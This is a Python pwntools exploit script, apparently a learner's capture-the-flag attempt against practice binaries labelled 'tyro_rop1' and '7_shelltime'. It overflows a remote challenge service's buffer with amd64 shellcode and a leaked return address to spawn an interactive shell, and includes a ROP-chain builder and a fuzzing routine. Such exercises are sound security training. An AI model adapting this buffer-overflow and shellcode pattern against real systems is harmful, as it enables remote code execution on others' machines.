#!/usr/bin/python

"""
First ROP payload exploit attempt on my own!
target is tyro_rop1 from DC24

"""

from pwn import *
import argparse
import sys
import os

def dump_rop_chain(elf, rop_elf):
	"""
	Saves ROP chain to a file
	"""
	
	dump_filename = "%s.dump" % (os.path.basename(elf.path))
	with open(dump_filename, "w") as dump_file:
		dump_file.write("%s\n" % rop_elf.dump())
		

def build_rop_payload(elf, buffaddr, dumpchain = False):
	"""
	This builds the rop payload
	
	dumpchain = True if you want to save the chain to a file (seeing is believing)
	"""
	rop = ROP(elf)
	rop.call('dec')
	#rop.exit(0x31337)
	
	if dumpchain:
		#dump_rop_chain(elf, rop)
		print "[i] ----------------------------------"
		print rop.dump()
		print "[i] ----------------------------------"
	
	# return raw byte version of payload
	return str(rop)

def getBuffAddress(pipe):
	"""
	Takes a process pipe and gets the address of the buffer
	"""
	addrline = pipe.recvline_contains("0x")
	addr = addrline.split()[-1:][0]
	return addr

def setupPipe():
	"""
	This returns a comm pipe
	"""
	
	# This pipe set up for local execution
	#pipe = process("7_shelltime")
	#Host: exploitables.dcdark.net Port: 43110(0/1)
	pipe = remote("exploitables.dcdark.net", 43110)
	#pipe = gdb.debug("tyro_rop1")
	
	return pipe

def build_exploit(elf, buffaddr, dumpchain = False):
	"""
	Build the exploit
	"""
	offset = 264
	
	bufaddress = p64(int(buffaddr, 16))
	#dec_addr = p64(0x00401020)
	context.update(arch='amd64')
	exploit = asm(shellcraft.amd64.linux.sh())
	exploit = exploit + 'B'*(offset-len(exploit)) + bufaddress
	#exploit = build_rop_payload(elf, buffaddr, True)
	
	print "[i] exploit: {}".format(repr(exploit))
	
	return exploit

def interact_shell(pipe):
	time.sleep(.5)
	pipe.sendline("id")
	pipe.interactive()	

def exploit():
	elf = ELF("7_shelltime")
	pipe = setupPipe()
	#gdb.attach("tyro_rop1")
	
	raw_input("[!] Press Enter..")
	
	
	buffaddr = getBuffAddress(pipe)
	print "[i] Got buffer address at: {}".format(buffaddr)
	
	# This is redirecting to the original echo command
	#buffaddr = "0x080486e0"
	exploit = build_exploit(elf, buffaddr, True)
	
	#time.sleep(.25)
	pipe.sendline(exploit)
	
	interact_shell(pipe)
	
def fuzz():
	pipe = setupPipe()
	gdb.attach("tyro_rop1")
	# not really needed, but it will get us to the entry line
	print getBuffAddress(pipe)
	
	#time.sleep(1)
	raw_input("Press Enter..")
	fz = cyclic(140)
	fz += '0\x84\x04\x08'
	fz += "AAAABBBBCCCCDDDD"
	
	pipe.sendline(fz)

def test():
	"""
	Test placeholder
	"""
	
	pipe = setupPipe()
	addr = getBuffAddress(pipe)
	
	print "I got: {}".format(addr)
		
def main():
	"""
	This is the thing with the stuff
	"""
	#test()
	exploit()
	#fuzz()

main()
	 
